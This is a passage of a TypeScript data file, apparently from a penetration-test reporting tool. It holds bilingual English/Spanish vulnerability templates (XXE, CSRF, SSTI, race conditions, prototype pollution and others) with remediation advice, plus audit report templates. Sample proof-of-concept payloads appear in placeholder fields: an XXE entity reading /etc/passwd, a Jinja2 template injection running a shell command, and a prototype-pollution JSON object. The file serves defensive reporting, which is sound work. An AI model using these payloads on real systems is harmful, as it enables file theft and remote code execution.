    details_es: '[TODO Proporcione una PoC, p. ej., una captura de pantalla de Burp Intruder que muestre un ataque de fuerza bruta de contraseña exitoso.]',
    remediation_en: {
      shortTerm: 'Implement rate limiting on the login page to slow down brute-force attacks.',
      mediumTerm: 'Enforce a strong password policy and implement multi-factor authentication.',
      longTerm: 'Review and redesign the entire session management lifecycle to ensure it is secure.',
    },
    remediation_es: {
      shortTerm: 'Implementar la limitación de velocidad en la página de inicio de sesión para ralentizar los ataques de fuerza bruta.',
      mediumTerm: 'Hacer cumplir una política de contraseñas segura e implementar la autenticación multifactor.',
      longTerm: 'Revisar y rediseñar todo el ciclo de vida de la gestión de sesiones para garantizar que sea seguro.',
    },
    references: ['https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/'],
    tags: ['Authentication', 'OWASP Top 10', 'A07:2021-Identification_and_Authentication_Failures'],
  },
  {
    id: 'vuln-009',
    title_en: 'Security Logging and Monitoring Failures',
    title_es: 'Fallos de Registro y Monitorización de Seguridad',
    cwe: 'CWE-778',
    severity: 'Medium',
    cvss: {
      score: 4.3,
      vectorString: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N',
      attackVector: 'Network',
      attackComplexity: 'Low',
      privilegesRequired: 'Low',
      userInteraction: 'None',
      scope: 'Unchanged',
      confidentiality: 'Low',
      integrity: 'None',
      availability: 'None',
    },
    overview_en: 'Insufficient logging and monitoring make it difficult to detect and respond to security incidents.',
    overview_es: 'El registro y la monitorización insuficientes dificultan la detección y respuesta a incidentes de seguridad.',
    technicalDescription_en: 'The application fails to log critical security events, such as failed login attempts, access control failures, or server-side input validation failures. Without these logs, it is nearly impossible to know if the application is under attack or has been breached.',
    technicalDescription_es: 'La aplicación no registra eventos de seguridad críticos, como intentos de inicio de sesión fallidos, fallos de control de acceso o fallos de validación de entrada del lado del servidor. Sin estos registros, es casi imposible saber si la aplicación está siendo atacada o si ha sido vulnerada.',
    affectedComponents_en: '[TODO Specify what is not being logged, e.g., Failed login attempts are not logged, preventing the detection of brute-force attacks.]',
    affectedComponents_es: '[TODO Especificar qué no se está registrando, p. ej., los intentos de inicio de sesión fallidos no se registran, lo que impide la detección de ataques de fuerza bruta.]',
    impact_en: 'Lack of logging and monitoring can significantly increase the time it takes to detect a breach, potentially allowing an attacker to maintain access for an extended period and cause more damage. It also makes forensic investigation and incident response much more difficult.',
    impact_es: 'La falta de registro y monitorización puede aumentar significativamente el tiempo que se tarda en detectar una brecha, lo que podría permitir a un atacante mantener el acceso durante un período prolongado y causar más daño. También dificulta mucho la investigación forense y la respuesta a incidentes.',
    recommendations_en: 'Log all security-relevant events, including successful and failed authentication attempts, access control decisions, and server-side errors. Ensure logs are in a consistent format, include sufficient detail, and are protected from tampering. Implement an alerting system to notify administrators of suspicious activity.',
    recommendations_es: 'Registre todos los eventos relevantes para la seguridad, incluidos los intentos de autenticación exitosos y fallidos, las decisiones de control de acceso y los errores del lado del servidor. Asegúrese de que los registros tengan un formato coherente, incluyan suficientes detalles y estén protegidos contra la manipulación. Implemente un sistema de alertas para notificar a los administradores sobre actividades sospechosas.',
    details_en: '[TODO Explain how you verified the lack of logging, e.g., "After performing a brute-force attack, no corresponding log entries were found in the application logs or the system logs."]',
    details_es: '[TODO Explique cómo verificó la falta de registro, p. ej., "Después de realizar un ataque de fuerza bruta, no se encontraron entradas de registro correspondientes en los registros de la aplicación o del sistema."]',
    remediation_en: {
      shortTerm: 'Enable logging for critical security events in the application and web server.',
      mediumTerm: 'Forward all logs to a centralized Security Information and Event Management (SIEM) system.',
      longTerm: 'Develop a comprehensive monitoring and incident response plan.',
    },
    remediation_es: {
      shortTerm: 'Habilitar el registro para eventos de seguridad críticos en la aplicación y el servidor web.',
      mediumTerm: 'Reenviar todos los registros a un sistema centralizado de Gestión de Información y Eventos de Seguridad (SIEM).',
      longTerm: 'Desarrollar un plan integral de monitorización y respuesta a incidentes.',
    },
    references: ['https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/'],
    tags: ['Logging', 'OWASP Top 10', 'A09:2021-Security_Logging_and_Monitoring_Failures'],
  },
  {
    id: 'vuln-010',
    title_en: 'XML External Entity (XXE) Injection',
    title_es: 'Inyección de Entidades Externas XML (XXE)',
    cwe: 'CWE-611',
    severity: 'High',
    cvss: {
      score: 7.5,
      vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N',
      attackVector: 'Network',
      attackComplexity: 'Low',
      privilegesRequired: 'None',
      userInteraction: 'None',
      scope: 'Unchanged',
      confidentiality: 'High',
      integrity: 'None',
      availability: 'None',
    },
    overview_en: 'An attacker can interfere with an application\'s processing of XML data to view files on the application server and interact with any back-end or external systems that the application itself can access.',
    overview_es: 'Un atacante puede interferir con el procesamiento de datos XML de una aplicación para ver archivos en el servidor de la aplicación e interactuar con cualquier sistema de back-end o externo al que la propia aplicación pueda acceder.',
    technicalDescription_en: 'The application parses XML data from an untrusted source. By including a malicious Document Type Definition (DTD), an attacker can define an external entity that points to a local file on the server. When the XML parser processes the DTD, it reads the local file and includes its content in the XML document, which may then be returned to the attacker.',
    technicalDescription_es: 'La aplicación procesa datos XML de una fuente no confiable. Al incluir una Definición de Tipo de Documento (DTD) maliciosa, un atacante puede definir una entidad externa que apunta a un archivo local en el servidor. Cuando el analizador XML procesa la DTD, lee el archivo local e incluye su contenido en el documento XML, que luego puede ser devuelto al atacante.',
    affectedComponents_en: '[TODO Specify the vulnerable endpoint and parameter, e.g., The XML parser processing the POST body to "/api/v1/users" is vulnerable.]',
    affectedComponents_es: '[TODO Especificar el endpoint y el parámetro vulnerables, p. ej., El analizador XML que procesa el cuerpo POST a "/api/v1/users" es vulnerable.]',
    impact_en: 'XXE can be used to read arbitrary files from the server, such as `/etc/passwd`. It can also be used to perform Server-Side Request Forgery (SSRF) attacks to scan the internal network.',
    impact_es: 'XXE se puede usar para leer archivos arbitrarios del servidor, como `/etc/passwd`. También se puede usar para realizar ataques de Server-Side Request Forgery (SSRF) para escanear la red interna.',
    recommendations_en: 'Disable DTDs (External Entities) completely in your XML parser. This is the simplest and most effective way to prevent XXE. All modern XML parsers have an option to do this.',
    recommendations_es: 'Deshabilite las DTD (Entidades Externas) por completo en su analizador XML. Esta es la forma más simple y efectiva de prevenir XXE. Todos los analizadores XML modernos tienen una opción para hacer esto.',
    details_en: '[TODO Provide a PoC payload, e.g., `<?xml version="1.0" ?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`]',
    details_es: '[TODO Proporcione una carga útil de PoC, p. ej., `<?xml version="1.0" ?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`]',
    remediation_en: {
      shortTerm: 'Configure the XML parser to disable DTDs and external entity resolution.',
      mediumTerm: 'If possible, refactor the application to use a simpler data format like JSON instead of XML.',
      longTerm: 'Perform a security audit of all XML parsers used in the organization to ensure they are configured securely.',
    },
    remediation_es: {
      shortTerm: 'Configurar el analizador XML para deshabilitar las DTD y la resolución de entidades externas.',
      mediumTerm: 'Si es posible, refactorizar la aplicación para usar un formato de datos más simple como JSON en lugar de XML.',
      longTerm: 'Realizar una auditoría de seguridad de todos los analizadores XML utilizados en la organización para garantizar que estén configurados de forma segura.',
    },
    references: ['https://portswigger.net/web-security/xxe'],
    tags: ['XXE', 'Injection'],
  },
  {
    id: 'vuln-011',
    title_en: 'Cross-Site Request Forgery (CSRF)',
    title_es: 'Cross-Site Request Forgery (CSRF)',
    cwe: 'CWE-352',
    severity: 'Medium',
    cvss: {
      score: 6.5,
      vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N',
      attackVector: 'Network',
      attackComplexity: 'Low',
      privilegesRequired: 'None',
      userInteraction: 'Required',
      scope: 'Unchanged',
      confidentiality: 'None',
      integrity: 'High',
      availability: 'None',
    },
    overview_en: 'An attacker can trick a logged-in user into performing an action they did not intend to.',
    overview_es: 'Un atacante puede engañar a un usuario que ha iniciado sesión para que realice una acción que no tenía la intención de hacer.',
    technicalDescription_en: 'The application relies solely on session cookies to identify the user and does not verify that the request was intentionally submitted by the user. An attacker can create a malicious web page that contains a hidden form. This form, when submitted, sends a request to the vulnerable application. If a logged-in user visits the attacker\'s page, their browser will automatically include their session cookie with the request, and the application will process the action as if the user submitted it.',
    technicalDescription_es: 'La aplicación se basa únicamente en las cookies de sesión para identificar al usuario y no verifica que la solicitud fue enviada intencionalmente por el usuario. Un atacante puede crear una página web maliciosa que contiene un formulario oculto. Este formulario, cuando se envía, envía una solicitud a la aplicación vulnerable. Si un usuario que ha iniciado sesión visita la página del atacante, su navegador incluirá automáticamente su cookie de sesión con la solicitud, y la aplicación procesará la acción como si el usuario la hubiera enviado.',
    affectedComponents_en: '[TODO Specify the vulnerable form/action, e.g., The "Update Email" form is missing a CSRF token.]',
    affectedComponents_es: '[TODO Especificar el formulario/acción vulnerable, p. ej., Al formulario "Actualizar correo electrónico" le falta un token CSRF.]',
    impact_en: 'CSRF attacks can be used to perform any state-changing action that the user is authorized to do, such as changing their password, making a purchase, or deleting their account.',
    impact_es: 'Los ataques CSRF se pueden usar para realizar cualquier acción que cambie el estado que el usuario esté autorizado a hacer, como cambiar su contraseña, realizar una compra o eliminar su cuenta.',
    recommendations_en: 'The most common and effective mitigation is the Synchronizer Token Pattern. The server generates a unique, unpredictable token for each user session and embeds it as a hidden field in every state-changing form. When the user submits the form, the server validates that the submitted token matches the one stored in their session.',
    recommendations_es: 'La mitigación más común y efectiva es el Patrón de Token Sincronizador. El servidor genera un token único e impredecible para cada sesión de usuario y lo incrusta como un campo oculto en cada formulario que cambia de estado. Cuando el usuario envía el formulario, el servidor valida que el token enviado coincida con el almacenado en su sesión.',
    details_en: '[TODO Provide a PoC. Create an HTML page with a form that submits a POST request to the vulnerable endpoint.]',
    details_es: '[TODO Proporcione una PoC. Cree una página HTML con un formulario que envíe una solicitud POST al endpoint vulnerable.]',
    remediation_en: {
      shortTerm: 'Implement anti-CSRF tokens on all state-changing forms.',
      mediumTerm: 'For highly sensitive actions, require the user to re-authenticate.',
      longTerm: 'Set the `SameSite` attribute on session cookies to `Strict` or `Lax` to provide an additional layer of defense.',
    },
    remediation_es: {
      shortTerm: 'Implementar tokens anti-CSRF en todos los formularios que cambian de estado.',
      mediumTerm: 'Para acciones muy sensibles, requerir que el usuario se vuelva a autenticar.',
      longTerm: 'Establecer el atributo `SameSite` en las cookies de sesión en `Strict` o `Lax` para proporcionar una capa adicional de defensa.',
    },
    references: ['https://portswigger.net/web-security/csrf'],
    tags: ['CSRF'],
  },
  {
    id: 'vuln-049',
    title_en: 'Server-Side Template Injection (SSTI)',
    title_es: 'Inyección de Plantillas del Lado del Servidor (SSTI)',
    cwe: 'CWE-1336',
    severity: 'Critical',
    cvss: {
      score: 9.8,
      vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
      attackVector: 'Network',
      attackComplexity: 'Low',
      privilegesRequired: 'None',
      userInteraction: 'None',
      scope: 'Unchanged',
      confidentiality: 'High',
      integrity: 'High',
      availability: 'High',
    },
    overview_en: 'An attacker can execute arbitrary code on the server by injecting malicious template syntax into a server-side template.',
    overview_es: 'Un atacante puede ejecutar código arbitrario en el servidor inyectando sintaxis de plantilla maliciosa en una plantilla del lado del servidor.',
    technicalDescription_en: 'The application uses a server-side templating engine (like Jinja2, FreeMarker, Velocity) and allows user input to be dynamically included in a template. If the input is not properly sanitized, an attacker can submit template expressions that are executed by the engine on the server. This can allow them to read files, execute commands, and compromise the server.',
    technicalDescription_es: 'La aplicación utiliza un motor de plantillas del lado del servidor (como Jinja2, FreeMarker, Velocity) y permite que la entrada del usuario se incluya dinámicamente en una plantilla. Si la entrada no se sanitiza correctamente, un atacante puede enviar expresiones de plantilla que son ejecutadas por el motor en el servidor. Esto puede permitirles leer archivos, ejecutar comandos y comprometer el servidor.',
    affectedComponents_en: '[TODO Specify the functionality and template engine, e.g., A marketing email feature using the Jinja2 templating engine.]',
    affectedComponents_es: '[TODO Especificar la funcionalidad y el motor de plantillas, p. ej., una función de correo electrónico de marketing que utiliza el motor de plantillas Jinja2.]',
    impact_en: 'Server-Side Template Injection often leads to remote code execution (RCE), giving the attacker full control over the application server.',
    impact_es: 'La inyección de plantillas del lado del servidor a menudo conduce a la ejecución remota de código (RCE), otorgando al atacante control total sobre el servidor de la aplicación.',
    recommendations_en: 'Never allow users to modify or submit template code. Use a "logic-less" templating engine if possible. If user input must be placed in a template, ensure it is strictly sanitized and contextually escaped.',
    recommendations_es: 'Nunca permitir que los usuarios modifiquen o envíen código de plantilla. Use un motor de plantillas "sin lógica" si es posible. Si la entrada del usuario debe colocarse en una plantilla, asegúrese de que esté estrictamente sanitizada y escapada contextualmente.',
    details_en: '[TODO Provide a PoC payload. For Jinja2, this could be `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen(\'id\').read() }}`.]',
    details_es: '[TODO Proporcionar una carga útil de PoC. Para Jinja2, esto podría ser `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen(\'id\').read() }}`.]',
    remediation_en: {
      shortTerm: 'Sanitize user input to remove any template syntax before it is processed.',
      mediumTerm: 'Use a sandboxed environment for template rendering to limit the potential impact of an exploit.',
      longTerm: 'Migrate to a safer templating solution or redesign the feature to avoid the need for dynamic template modification.',
    },
    remediation_es: {
      shortTerm: 'Sanitizar la entrada del usuario para eliminar cualquier sintaxis de plantilla antes de que se procese.',
      mediumTerm: 'Utilizar un entorno "sandbox" para la renderización de plantillas para limitar el impacto potencial de un exploit.',
      longTerm: 'Migrar a una solución de plantillas más segura o rediseñar la función para evitar la necesidad de modificación dinámica de plantillas.',
    },
    references: ['https://portswigger.net/web-security/server-side-template-injection'],
    tags: ['SSTI', 'RCE', 'Template Injection'],
  },
  {
    id: 'vuln-050',
    title_en: 'Race Condition',
    title_es: 'Condición de Carrera',
    cwe: 'CWE-362',
    severity: 'Medium',
    cvss: {
      score: 6.5,
      vectorString: 'CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:L',
      attackVector: 'Network',
      attackComplexity: 'High',
      privilegesRequired: 'Low',
      userInteraction: 'None',
      scope: 'Unchanged',
      confidentiality: 'None',
      integrity: 'High',
      availability: 'Low',
    },
    overview_en: 'An attacker can exploit a flaw in the application\'s handling of concurrent operations to cause unintended behavior, such as bypassing security checks or corrupting data.',
    overview_es: 'Un atacante puede explotar un fallo en el manejo de operaciones concurrentes de la aplicación para causar un comportamiento no deseado, como eludir controles de seguridad o corromper datos.',
    technicalDescription_en: 'The application performs a sequence of operations that are not atomic (e.g., checking a user\'s balance and then making a withdrawal). An attacker can send multiple requests simultaneously, causing the operations to interleave in an unexpected way. For example, they could submit two withdrawal requests at the same time, and the application might check the balance for both requests before either withdrawal is processed, allowing the user to withdraw more money than they have.',
    technicalDescription_es: 'La aplicación realiza una secuencia de operaciones que no son atómicas (p. ej., verificar el saldo de un usuario y luego realizar un retiro). Un atacante puede enviar múltiples solicitudes simultáneamente, haciendo que las operaciones se intercalen de una manera inesperada. Por ejemplo, podrían enviar dos solicitudes de retiro al mismo tiempo, y la aplicación podría verificar el saldo para ambas solicitudes antes de que se procese cualquiera de los retiros, permitiendo al usuario retirar más dinero del que tiene.',
    affectedComponents_en: '[TODO Specify the functionality that is vulnerable to a race condition, e.g., transferring funds or using a one-time coupon.]',
    affectedComponents_es: '[TODO Especificar la funcionalidad que es vulnerable a una condición de carrera, p. ej., transferir fondos o usar un cupón de un solo uso.]',
    impact_en: 'Race conditions can lead to data corruption, financial loss, and bypass of security logic. The impact is highly dependent on the specific context.',
    impact_es: 'Las condiciones de carrera pueden conducir a la corrupción de datos, pérdidas financieras y la elusión de la lógica de seguridad. El impacto depende en gran medida del contexto específico.',
    recommendations_en: 'Ensure that sequences of operations that must be atomic are protected by proper locking mechanisms (e.g., database transactions, mutexes, semaphores).',
    recommendations_es: 'Asegurarse de que las secuencias de operaciones que deben ser atómicas estén protegidas por mecanismos de bloqueo adecuados (p. ej., transacciones de base de datos, mutex, semáforos).',
    details_en: '[TODO Provide a PoC, often using a tool like Burp Suite\'s Turbo Intruder to send many requests simultaneously.]',
    details_es: '[TODO Proporcionar un PoC, a menudo usando una herramienta como Turbo Intruder de Burp Suite para enviar muchas solicitudes simultáneamente.]',
    remediation_en: {
      shortTerm: 'Implement a pessimistic lock (e.g., a database row lock) on the resource being modified.',
      mediumTerm: 'Refactor the business logic to use atomic operations provided by the database or language.',
      longTerm: 'Perform a thorough review of all concurrent operations in the application to identify other potential race conditions.',
    },
    remediation_es: {
      shortTerm: 'Implementar un bloqueo pesimista (p. ej., un bloqueo de fila de base de datos) en el recurso que se está modificando.',
      mediumTerm: 'Refactorizar la lógica de negocio para utilizar operaciones atómicas proporcionadas por la base de datos o el lenguaje.',
      longTerm: 'Realizar una revisión exhaustiva de todas las operaciones concurrentes en la aplicación para identificar otras posibles condiciones de carrera.',
    },
    references: ['https://portswigger.net/web-security/race-conditions'],
    tags: ['Race Condition', 'Business Logic'],
  },
  {
    id: 'vuln-051',
    title_en: 'Prototype Pollution',
    title_es: 'Contaminación de Prototipos',
    cwe: 'CWE-1321',
    severity: 'High',
    cvss: {
      score: 8.8,
      vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H',
      attackVector: 'Network',
      attackComplexity: 'Low',
      privilegesRequired: 'None',
      userInteraction: 'Required',
      scope: 'Unchanged',
      confidentiality: 'High',
      integrity: 'High',
      availability: 'High',
    },
    overview_en: 'An attacker can manipulate the `__proto__`, `constructor`, or `prototype` properties of JavaScript objects, leading to the modification of the prototype of base objects. This can result in denial of service, cross-site scripting, or even remote code execution.',
    overview_es: 'Un atacante puede manipular las propiedades `__proto__`, `constructor` o `prototype` de los objetos de JavaScript, lo que lleva a la modificación del prototipo de los objetos base. Esto puede resultar en denegación de servicio, cross-site scripting o incluso ejecución remota de código.',
    technicalDescription_en: 'The application insecurely merges or clones objects. An attacker can supply a malicious JSON payload (e.g., `{"__proto__": {"isAdmin": true}}`) that, when processed, modifies the `Object.prototype` to include an `isAdmin` property. Subsequently, every object in the application will inherit this property, potentially leading to privilege escalation.',
    technicalDescription_es: 'La aplicación fusiona o clona objetos de forma insegura. Un atacante puede suministrar una carga útil JSON maliciosa (p. ej., `{"__proto__": {"isAdmin": true}}`) que, al procesarse, modifica el `Object.prototype` para incluir una propiedad `isAdmin`. Posteriormente, cada objeto en la aplicación heredará esta propiedad, lo que podría conducir a una escalada de privilegios.',
    affectedComponents_en: '[TODO Specify the vulnerable code, often related to object merging or query parameter parsing libraries.]',
    affectedComponents_es: '[TODO Especificar el código vulnerable, a menudo relacionado con la fusión de objetos o las librerías de análisis de parámetros de consulta.]',
    impact_en: 'Prototype pollution can have widespread and unpredictable consequences, ranging from denial of service to remote code execution, depending on the application logic and the properties that are polluted.',
    impact_es: 'La contaminación de prototipos puede tener consecuencias generalizadas e impredecibles, que van desde la denegación de servicio hasta la ejecución remota de código, dependiendo de la lógica de la aplicación y las propiedades que se contaminan.',
    recommendations_en: 'Sanitize user input to reject keys named `__proto__`, `constructor`, or `prototype`. Use `Object.create(null)` to create objects that do not have a prototype. Use secure object merging libraries and keep all dependencies up to date.',
    recommendations_es: 'Sanitizar la entrada del usuario para rechazar claves llamadas `__proto__`, `constructor` o `prototype`. Usar `Object.create(null)` para crear objetos que no tengan un prototipo. Usar librerías seguras de fusión de objetos y mantener todas las dependencias actualizadas.',
    details_en: '[TODO Provide a PoC payload and demonstrate its effect on the application.]',
    details_es: '[TODO Proporcionar una carga útil de PoC y demostrar su efecto en la aplicación.]',
    remediation_en: {
      shortTerm: 'Implement input validation to block any payloads containing `__proto__`, `constructor`, or `prototype` keys.',
      mediumTerm: 'Update all libraries and frameworks to their latest versions, as many common libraries have been patched for this vulnerability.',
      longTerm: 'Use `Object.freeze(Object.prototype)` at the start of the application to prevent any modifications to the base object prototype.',
    },
    remediation_es: {
      shortTerm: 'Implementar la validación de entrada para bloquear cualquier carga útil que contenga las claves `__proto__`, `constructor` o `prototype`.',
      mediumTerm: 'Actualizar todas las librerías y frameworks a sus últimas versiones, ya que muchas librerías comunes han sido parcheadas para esta vulnerabilidad.',
      longTerm: 'Usar `Object.freeze(Object.prototype)` al inicio de la aplicación para evitar cualquier modificación al prototipo del objeto base.',
    },
    references: ['https://portswigger.net/web-security/prototype-pollution'],
    tags: ['Prototype Pollution', 'JavaScript'],
  }
];

export const projectTemplates: ProjectTemplate[] = [
  {
    id: 'template-1',
    name_en: 'Full Audit',
    name_es: 'Auditoría Completa',
    icon: 'Scan',
    description_en: 'A comprehensive security audit covering external, internal, and web application testing.',
    description_es: 'Auditoría de seguridad integral que abarca pruebas externas, internas y de aplicaciones web.',
    scope_en:
`<!-- section-id: template-1-en-1 -->

## Executive Summary
This report details the findings of a comprehensive security assessment conducted on behalf of **[TODO Client Name]**. The primary objective was to identify and assess security vulnerabilities across the company's external and internal networks, as well as key web applications. The engagement simulated real-world attack scenarios to provide a realistic evaluation of the current security posture.

---

<!-- section-id: template-1-en-2 -->

## Scope & Methodology
The assessment was conducted between **[TODO Start Date]** and **[TODO End Date]**. The testing approach combined automated scanning and manual exploitation techniques, following a black-box/gray-box model.

### Scope
- **Web Applications:** [TODO list of domains/apps]
- **External Network:** [TODO list of IPs/ranges]
- **Internal Network:** [TODO list of IPs/ranges]

### Methodology
1. **Reconnaissance:** Mapping the attack surface and gathering information.
2. **Vulnerability Analysis:** Identifying weaknesses in systems and applications.
3. **Exploitation:** Attempting to gain unauthorized access.
4. **Post-Exploitation:** Assessing the impact of a breach and identifying lateral movement paths.
5. **Reporting:** Documenting all findings and providing actionable recommendations.

---

<!-- section-id: template-1-en-3 -->

## Attack Narrative
[TODO Provide a step-by-step narrative of the attack path, from initial reconnaissance to the final objectives achieved. This should be detailed and easy to follow.]

---

<!-- section-id: template-1-en-4 -->

## Findings Classification
| Severity | CVSS v3.1 Score | Description |
|---|---|---|
| Critical | 9.0 - 10.0 | Vulnerabilities that could lead to immediate system compromise, large-scale data breaches, or severe disruption of key business functions. |
| High | 7.0 - 8.9 | Vulnerabilities that could lead to unauthorized access, data exposure, or significant disruption of services. |
| Medium | 4.0 - 6.9 | Vulnerabilities that could expose sensitive information or provide attackers with a foothold for further attacks. |
| Low | 0.1 - 3.9 | Minor issues that have a low impact or are difficult to exploit. |
| Informational | 0.0 | Observations that do not pose an immediate risk but are relevant to the security posture. |`,
    scope_es:
`<!-- section-id: template-1-es-1 -->

## Resumen Ejecutivo
Este informe detalla los hallazgos de una evaluación de seguridad integral realizada para **[TODO Nombre del Cliente]**. El objetivo principal fue identificar y evaluar las vulnerabilidades de seguridad en las redes externas e internas de la empresa, así como en aplicaciones web clave. El compromiso simuló escenarios de ataque del mundo real para proporcionar una evaluación realista de la postura de seguridad actual.

---

<!-- section-id: template-1-es-2 -->

## Alcance y Metodología
La evaluación se llevó a cabo entre el **[TODO Fecha de Inicio]** y el **[TODO Fecha de Fin]**. El enfoque de las pruebas combinó escaneo automatizado y técnicas de explotación manual, siguiendo un modelo de caja negra/gris.

### Alcance
- **Aplicaciones Web:** [TODO lista de dominios/apps]
- **Red Externa:** [TODO lista de IPs/rangos]
- **Red Interna:** [TODO lista de IPs/rangos]

### Metodología
1. **Reconocimiento:** Mapeo de la superficie de ataque y recopilación de información.
2. **Análisis de Vulnerabilidades:** Identificación de debilidades en sistemas y aplicaciones.
3. **Explotación:** Intento de obtener acceso no autorizado.
4. **Post-Explotación:** Evaluación del impacto de una brecha e identificación de rutas de movimiento lateral.
5. **Reporte:** Documentación de todos los hallazgos y provisión de recomendaciones accionables.

---

<!-- section-id: template-1-es-3 -->

## Narrativa del Ataque
[TODO Proporcione una narrativa paso a paso de la ruta de ataque, desde el reconocimiento inicial hasta los objetivos finales alcanzados. Debe ser detallada y fácil de seguir.]

---

<!-- section-id: template-1-es-4 -->

## Clasificación de Hallazgos
| Severidad | Puntuación CVSS v3.1 | Descripción |
|---|---|---|
| Crítica | 9.0 - 10.0 | Vulnerabilidades que podrían llevar a un compromiso inmediato del sistema, brechas de datos a gran escala o una interrupción grave de las funciones clave del negocio. |
| Alta | 7.0 - 8.9 | Vulnerabilidades que podrían llevar a un acceso no autorizado, exposición de datos o una interrupción significativa de los servicios. |
| Media | 4.0 - 6.9 | Vulnerabilidades que podrían exponer información sensible o proporcionar a los atacantes un punto de apoyo para ataques posteriores. |
| Baja | 0.1 - 3.9 | Problemas menores que tienen un bajo impacto o son difíciles de explotar. |
| Informativa | 0.0 | Observaciones que no representan un riesgo inmediato pero son relevantes para la postura de seguridad. |`
  },
  {
    id: 'template-2',
    name_en: 'External Audit',
    name_es: 'Auditoría Externa',
    icon: 'Globe',
    description_en: 'Focuses on publicly accessible assets to identify vulnerabilities from an attacker\'s perspective.',
    description_es: 'Se centra en los activos accesibles públicamente para identificar vulnerabilidades desde la perspectiva de un atacante.',
    scope_en:
`<!-- section-id: template-2-en-1 -->

## Executive Summary
This report outlines the results of an external penetration test conducted on the internet-facing assets of **[TODO Client Name]**. The assessment aimed to identify vulnerabilities that could be exploited by a remote attacker to compromise the security of the organization's perimeter.

---

<!-- section-id: template-2-en-2 -->

## Scope & Methodology
The assessment was conducted between **[TODO Start Date]** and **[TODO End Date]** from the perspective of an external, unauthenticated attacker (black-box).

### Scope
- **Web Applications:** [TODO list of domains/apps]
- **External Network:** [TODO list of IPs/ranges]

### Methodology
1. **Reconnaissance:** Discovering subdomains, open ports, and services.
2. **Vulnerability Scanning:** Using automated tools to identify common vulnerabilities.
3. **Manual Verification & Exploitation:** Manually validating findings and attempting to exploit identified weaknesses.
4. **Reporting:** Documenting vulnerabilities and providing remediation guidance.

---

<!-- section-id: template-2-en-3 -->

## Attack Narrative
[TODO Provide a step-by-step narrative of the attack path, focusing on how the external perimeter was breached or could be breached.]

---

<!-- section-id: template-2-en-4 -->

## Findings Classification
| Severity | CVSS v3.1 Score | Description |
|---|---|---|
| Critical | 9.0 - 10.0 | Vulnerabilities that could lead to immediate system compromise or a breach of the network perimeter. |
| High | 7.0 - 8.9 | Vulnerabilities that could allow an attacker to gain unauthorized access to systems or data. |
| Medium | 4.0 - 6.9 | Weaknesses that could reveal sensitive information or be chained with other vulnerabilities. |
| Low | 0.1 - 3.9 | Minor issues that reduce the overall security posture but are not directly exploitable. |
| Informational | 0.0 | Observations about the external footprint of the organization. |`,
    scope_es:
`<!-- section-id: template-2-es-1 -->

## Resumen Ejecutivo
Este informe describe los resultados de una prueba de penetración externa realizada sobre los activos de **[TODO Nombre del Cliente]** expuestos a Internet. La evaluación tuvo como objetivo identificar vulnerabilidades que podrían ser explotadas por un atacante remoto para comprometer la seguridad del perímetro de la organización.

---

<!-- section-id: template-2-es-2 -->

## Alcance y Metodología
La evaluación se llevó a cabo entre el **[TODO Fecha de Inicio]** y el **[TODO Fecha de Fin]** desde la perspectiva de un atacante externo no autenticado (caja negra).

### Alcance
- **Aplicaciones Web:** [TODO lista de dominios/apps]
- **Red Externa:** [TODO lista de IPs/rangos]

### Metodología
1. **Reconocimiento:** Descubrimiento de subdominios, puertos abiertos y servicios.
2. **Escaneo de Vulnerabilidades:** Uso de herramientas automatizadas para identificar vulnerabilidades comunes.
3. **Verificación Manual y Explotación:** Validación manual de hallazgos e intento de explotar las debilidades identificadas.
4. **Reporte:** Documentación de vulnerabilidades y provisión de guías de remediación.

---

<!-- section-id: template-2-es-3 -->

## Narrativa del Ataque
[TODO Proporcione una narrativa paso a paso de la ruta de ataque, centrándose en cómo se rompió o podría romperse el perímetro externo.]

---

<!-- section-id: template-2-es-4 -->

## Clasificación de Hallazgos
| Severidad | Puntuación CVSS v3.1 | Descripción |
|---|---|---|
| Crítica | 9.0 - 10.0 | Vulnerabilidades que podrían llevar a un compromiso inmediato del sistema o a una brecha en el perímetro de la red. |
| Alta | 7.0 - 8.9 | Vulnerabilidades que podrían permitir a un atacante obtener acceso no autorizado a sistemas o datos. |
| Media | 4.0 - 6.9 | Debilidades que podrían revelar información sensible o ser encadenadas con otras vulnerabilidades. |
| Baja | 0.1 - 3.9 | Problemas menores que reducen la postura de seguridad general pero no son directamente explotables. |
| Informativa | 0.0 | Observaciones sobre la huella externa de la organización. |`,
    appendix_en: `
<!-- section-id: template-2-en-appendix-1 -->

### A. Subdomain Discovery
| URL | Description | Discovery Method |
|---|---|---|
| [TODO FILL IN DISCOVERED VHOSTS/SUBDOMAINS] | | |

---

<!-- section-id: template-2-en-appendix-2 -->

### B. Open Ports and Services
| IP Address | Port | Service | Banner/Version |
|---|---|---|---|
| [TODO FILL IN AS APPROPRIATE] | | | |
`,
    appendix_es: `
<!-- section-id: template-2-es-appendix-1 -->

### A. Descubrimiento de Subdominios
| URL | Descripción | Método de Descubrimiento |
|---|---|---|
| [TODO RELLENAR VHOSTS/SUBDOMINIOS DESCUBIERTOS] | | |

---

<!-- section-id: template-2-es-appendix-2 -->

### B. Puertos y Servicios Abiertos
| Dirección IP | Puerto | Servicio | Banner/Versión |
|---|---|---|---|
| [TODO RELLENAR SEGÚN CORRESPONDA] | | | |
`
  },
  {
    id: 'template-3',
    name_en: 'Internal Audit',
    name_es: 'Auditoría Interna',
    icon: 'Network',
    description_en: 'An assessment of the internal network to find security weaknesses from within the perimeter.',
    description_es: 'Evaluación de la red interna para encontrar debilidades de seguridad desde dentro del perímetro.',
    scope_en:
`<!-- section-id: template-3-en-1 -->

## Executive Summary
